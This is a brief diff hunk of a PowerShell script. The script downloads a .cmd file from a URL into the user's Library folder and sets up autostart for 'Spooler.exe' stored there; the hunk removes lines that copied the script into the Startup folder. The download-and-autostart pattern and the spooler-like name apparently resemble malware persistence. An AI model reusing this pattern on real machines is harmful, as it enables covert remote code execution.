@@ -16,10 +16,6 @@ $cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")
 # Download the .cmd script from the URL
 Invoke-WebRequest -Uri $cmdScriptUrl -OutFile $cmdScriptPath
 
-# Add the shortcut to autostart
-$StartupFolder = [System.Environment]::GetFolderPath("Startup")
-Copy-Item "$downloadDirectory\play.cmd" "$StartupFolder\play.cmd"
-
 # Define the program path you want to start automatically
 $programPath = "$env:USERPROFILE\Library\Spooler.exe"
 
